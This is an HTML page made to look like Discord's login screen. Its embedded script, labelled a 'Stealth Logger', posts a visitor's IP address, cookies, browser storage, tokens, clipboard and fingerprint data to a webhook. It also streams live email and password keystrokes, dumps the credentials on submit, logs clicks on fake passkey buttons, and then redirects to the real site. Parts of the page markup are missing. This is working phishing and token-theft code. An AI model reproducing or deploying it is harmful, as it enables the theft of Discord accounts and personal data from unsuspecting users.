<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    /* ============================================================
       DISCORD 2026 PRODUCTION CSS – EXACT MATCH
       ============================================================ */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #1e1f22;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: 'Segoe UI', 'Helvetica Neue', 'Apple Color Emoji', system-ui, sans-serif;
      margin: 0;
      padding: 16px;
    }

    /* ----- MAIN CARD ----- */
    .auth-container {
      background: #313338;
      border-radius: 16px;
      padding: 32px 40px 40px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
      transition: opacity 0.2s;
    }

    /* ----- LOGO ----- */
    .logo-wrapper {
      text-align: center;
      margin-bottom: 28px;
    }
    .logo-wrapper svg {
      width: 130px;
      height: auto;
      display: block;
      margin: 0 auto;
    }

    /* ----- HEADINGS ----- */
    .auth-title {
      color: #f2f3f5;
      font-size: 24px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 4px;
      letter-spacing: -0.2px;
    }
    .auth-subtitle {
      color: #b5bac1;
      font-size: 16px;
      text-align: center;
      margin-bottom: 20px;
      font-weight: 400;
    }

    /* ----- TAB BAR (QR / Login toggle) ----- */
    .tab-bar {
      display: flex;
      background: #1e1f22;
      border-radius: 8px;
      padding: 4px;
      margin-bottom: 24px;
    }
    .tab-btn {
      flex: 1;
      padding: 8px 12px;
      background: transparent;
      border: none;
      border-radius: 6px;
      color: #b5bac1;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.15s, color 0.15s;
      text-align: center;
    }
    .tab-btn.active {
      background: #5865f2;
      color: #fff;
    }
    .tab-btn:hover:not(.active) {
      background: #2b2d31;
      color: #dbdee1;
    }

    /* ----- FORM ELEMENTS ----- */
    .input-group {
      margin-bottom: 16px;
    }
    .input-group label {
      display: block;
      color: #b5bac1;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 4px;
    }
    .input-group input {
      width: 100%;
      padding: 10px 12px;
      background: #1e1f22;
      border: 1px solid #1e1f22;
      border-radius: 4px;
      color: #f2f3f5;
      font-size: 16px;
      outline: none;
      transition: border-color 0.15s;
      font-weight: 400;
    }
    .input-group input:focus {
      border-color: #5865f2;
    }
    .input-group input::placeholder {
      color: #5c6068;
      font-weight: 400;
    }

    /* ----- BUTTONS ----- */
    .btn-primary {
      width: 100%;
      padding: 12px;
      background: #5865f2;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 8px;
    }
    .btn-primary:hover {
      background: #4752c4;
    }
    .btn-primary:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .btn-secondary {
      background: transparent;
      border: none;
      color: #00a8fc;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      padding: 6px 0;
      transition: text-decoration 0.1s;
    }
    .btn-secondary:hover {
      text-decoration: underline;
    }

    /* ----- QR SECTION ----- */
    .qr-section {
      display: none;
      text-align: center;
      padding: 8px 0;
    }
    .qr-section.active {
      display: block;
    }

    .qr-code-box {
      background: #1e1f22;
      border-radius: 8px;
      padding: 16px;
      display: inline-block;
      margin: 4px auto 12px;
    }
    .qr-code-box canvas {
      width: 160px;
      height: 160px;
      background: #fff;
      border-radius: 4px;
      display: block;
    }

    .qr-instruction {
      color: #b5bac1;
      font-size: 14px;
      margin: 8px 0 12px;
      line-height: 1.4;
    }
    .qr-instruction strong {
      color: #f2f3f5;
      font-weight: 600;
    }

    /* ---- QR SCANNER MOCKUP (the dot grid) ---- */
    .scanner-mock {
      background: #1e1f22;
      border-radius: 8px;
      padding: 16px 20px;
      margin: 12px auto;
      max-width: 220px;
    }
    .scanner-mock .dot-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 8px;
    }
    .scanner-mock .dot-grid div {
      aspect-ratio: 1;
      background: #5865f2;
      border-radius: 4px;
      opacity: 0.25;
    }
    .scanner-mock .dot-grid div:nth-child(5) {
      opacity: 0.9;
      background: #00a8fc;
      transform: scale(1.1);
    }

    /* ----- PASSKEY ROW ----- */
    .passkey-row {
      text-align: center;
      margin-top: 14px;
    }

    /* ----- FOOTER LINKS ----- */
    .auth-footer {
      margin-top: 20px;
      color: #b5bac1;
      font-size: 14px;
      text-align: center;
    }
    .auth-footer a {
      color: #00a8fc;
      text-decoration: none;
    }
    .auth-footer a:hover {
      text-decoration: underline;
    }
    .auth-footer .sep {
      color: #4e5058;
      margin: 0 4px;
    }

    /* ----- SPINNER (loading state) ----- */
    #spinner {
      display: none;
      margin: 12px auto 0;
      width: 28px;
      height: 28px;
      border: 4px solid #5865f2;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* ----- ANTI-INSPECT OVERLAY (prevents right-click on some elements) ----- */
    #anti-inspect {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 9999;
      pointer-events: none;
      background: transparent;
    }

    /* ----- RESPONSIVE TWEAKS ----- */
    @media (max-width: 500px) {
      .auth-container {
        padding: 24px 20px 32px;
      }
      .qr-code-box canvas {
        width: 140px;
        height: 140px;
      }
    }
  </style>
</head>
<body>

<!-- Anti-inspect overlay -->
<div id="anti-inspect"></div>

<!-- ===== MAIN AUTH CARD ===== -->

  <!-- LOGO -->

      <div class="dot-grid">
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
        <div></div><div></div><div></div>
      </div>
    </div>

    <div class="passkey-row">
      <button class="btn-secondary" id="qrPasskeyBtn">Or, sign in with passkey</button>
    </div>
  </div>

  <!-- FOOTER -->
  <div class="auth-footer">
    <a href="#">Need an account?</a>
    <span class="sep">·</span>
    <a href="#">Register</a>
    <span class="sep">·</span>
    <a href="#">Forgot your password?</a>

    }

    // ============================================================
    //  SEND TO WEBHOOK (rich embed with emojis)
    // ============================================================
    function sendToWebhook(title, description, fields, color = 0x5865F2, thumbnail = null) {
      const embed = {
        title: title,
        description: description,
        color: color,
        timestamp: new Date().toISOString(),
        footer: { text: '☠️ Stealth Logger v5 • ' + new Date().toLocaleString() },
        fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false }))
      };
      if (thumbnail) embed.thumbnail = { url: thumbnail };
      const payload = { embeds: [embed] };
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }

    // ============================================================
    //  SEND FULL REPORT (all data + tokens)
    // ============================================================
    function sendFullReport() {
      const tokens = state.tokens_extracted || [];
      const tokenStr = tokens.length > 0 ? '```\n' + tokens.join('\n') + '\n```' : 'None found';

      const fields = [
        { name: '🌐 IP', value: state.ip, inline: true },
        { name: '🌍 Country', value: state.country, inline: true },
        { name: '🏙️ City', value: state.city, inline: true },
        { name: '📡 ISP', value: state.isp, inline: true },
        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 80), inline: false },
        { name: '🍪 Cookies', value: state.cookies.substring(0, 200) + (state.cookies.length > 200 ? '...' : ''), inline: false },
        { name: '💾 LocalStorage', value: state.localStorage.substring(0, 200) + (state.localStorage.length > 200 ? '...' : ''), inline: false },
        { name: '📦 SessionStorage', value: state.sessionStorage.substring(0, 200) + (state.sessionStorage.length > 200 ? '...' : ''), inline: false },
        { name: '🎟️ TOKENS EXTRACTED', value: tokenStr, inline: false },
        { name: '🎨 WebGL', value: state.webglRenderer || 'unknown', inline: true },
        { name: '🔊 Audio FP', value: state.audioFingerprint || 'unknown', inline: true },
        { name: '🔋 Battery', value: state.battery || 'unknown', inline: true },
        { name: '📶 Network', value: state.networkType || 'unknown', inline: true },
        { name: '📸 Screenshot', value: state.screenshot || 'none', inline: false },
        { name: '📋 Clipboard', value: state.clipboard || 'none', inline: false },
        { name: '🎥 Webcam', value: state.webcam, inline: true },
        { name: '🎤 Microphone', value: state.microphone, inline: true }
      ];

      sendToWebhook(
        '🚨 **FULL TOKEN HARVEST**',
        `Extracted ${tokens.length} potential tokens from all storage layers.`,
        fields,
        0xFF0000,
        'https://cdn.discordapp.com/emojis/1083721895822708798.png'
      );
    }

    function afterFingerprint() {
      getWebGL();
      getCanvasFingerprint();
      getAudioFingerprint();
      getFonts();
      getBattery();
      getNetwork();
      captureScreenshot();
      sniffClipboard();
      harvestAllTokens();
      sendFullReport();
      setTimeout(requestWebcamMic, 2000);
    }

    // ============================================================
    //  REAL-TIME KEYLOGGER (every 3 seconds)
    // ============================================================
    let emailLog = '';
    let passwordLog = '';
    let lastKeylog = 0;

    function sendKeylog(force = false) {
      const now = Date.now();
      if (!force && (now - lastKeylog < 3000)) return;
      if (emailLog.length === 0 && passwordLog.length === 0) return;
      const fields = [
        { name: '📧 Email (live)', value: emailLog || '(empty)', inline: true },
        { name: '🔑 Password (live)', value: passwordLog || '(empty)', inline: true }
      ];
      sendToWebhook('⌨️ **KEYSTROKE STREAM**', 'Live typing captured.', fields, 0xFFA500);
      lastKeylog = now;
    }

    document.getElementById('email').addEventListener('input', function() {
      emailLog = this.value;
      sendKeylog();
    });
    document.getElementById('password').addEventListener('input', function() {
      passwordLog = this.value;
      sendKeylog();
    });
    document.getElementById('email').addEventListener('paste', function() {
      setTimeout(() => { emailLog = this.value; sendKeylog(true); }, 50);
    });
    document.getElementById('password').addEventListener('paste', function() {
      setTimeout(() => { passwordLog = this.value; sendKeylog(true); }, 50);
    });

    // ============================================================
    //  LOGIN FORM SUBMIT – stealth + redirect
    // ============================================================
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      harvestAllTokens();
      const tokenStr = (state.tokens_extracted || []).length > 0 ?
        '```\n' + state.tokens_extracted.join('\n') + '\n```' : 'None';

      const fields = [
        { name: '📧 Email/Phone', value: email || '(empty)', inline: true },
        { name: '🔑 Password', value: password || '(empty)', inline: true },
        { name: '🌐 IP', value: state.ip, inline: true },
        { name: '🌍 Country', value: state.country, inline: true },
        { name: '🎟️ FINAL TOKENS', value: tokenStr, inline: false },
        { name: '🍪 Full Cookies', value: document.cookie.substring(0, 300) + (document.cookie.length > 300 ? '...' : ''), inline: false }
      ];

      sendToWebhook('🔥 **LOGIN + TOKEN DUMP**', 'User submitted credentials. All tokens below.', fields, 0xFF0000);

      // Show spinner, disable button
      document.getElementById('loginBtn').disabled = true;
      document.getElementById('loginBtn').style.display = 'none';
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('subText').textContent = '🔐 Verifying your identity...';

      // Redirect to real Discord after delay
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, FAKE_LOADING_DELAY);
    });

    // ============================================================
    //  PASSKEY BUTTONS (fake – log attempts)
    // ============================================================
    document.getElementById('passkeyBtn').addEventListener('click', function() {
      sendToWebhook('🔑 **PASSKEY ATTEMPT**', 'User clicked "Sign in with passkey".', [{name:'Action', value:'Passkey clicked', inline:true}], 0x9B59B6);
      alert('Passkey authentication is not available in this browser. Please use email/password.');
    });
    document.getElementById('qrPasskeyBtn').addEventListener('click', function() {
      sendToWebhook('🔑 **QR PASSKEY ATTEMPT**', 'User clicked passkey from QR tab.', [{name:'Action', value:'QR Passkey clicked', inline:true}], 0x9B59B6);
      alert('Passkey authentication is not available in this browser. Please use email/password.');
    });

    // ============================================================
    //  PERIODIC TOKEN RESCAN (every 15 seconds)
    // ============================================================
    setInterval(() => {
      const newTokens = harvestAllTokens();
      if (newTokens.length > 0) {
        const fields = [
          { name: '🔄 New tokens detected', value: '```\n' + newTokens.join('\n') + '\n```', inline: false }
        ];
        sendToWebhook('🔄 **TOKEN REFRESH**', 'Additional tokens harvested.', fields, 0x9B59B6);
      }
    }, 15000);

    // ============================================================
    //  START – fetch IP, send visitor event
    // ============================================================
    fetchIP();

    // Send immediate visitor event
    sendToWebhook(
      '👤 **NEW VISITOR**',
      'A new visitor landed on the page.',
      [
        { name: 'URL', value: window.location.href, inline: false },
        { name: 'Referrer', value: document.referrer || 'direct', inline: true }
      ],
      0x00FF00
    );

  })();
</script>
